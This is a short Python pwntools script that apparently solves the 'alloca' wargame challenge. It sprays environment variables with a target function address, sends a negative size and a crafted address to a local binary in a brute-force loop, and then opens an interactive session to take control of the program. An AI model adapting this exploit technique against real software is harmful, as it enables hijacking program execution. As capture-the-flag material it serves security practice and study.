from pwn import *

#env_addr = 0xfff1fdf7 - 0x200
env_addr = -918536
callme = 0x80485ab
payload = p32(callme) * 10000
my_env = { str(i): payload for i in range(20) }
attemp = 0

while True:
        attemp += 1
        print "Attemp: ", attemp
        p = process('/home/alloca/alloca', env=my_env)
        p.recvuntil('how to.')
        p.recvuntil('show you.\n')
        p.sendline('-68')
        p.sendline(str(env_addr))
        p.interactive()
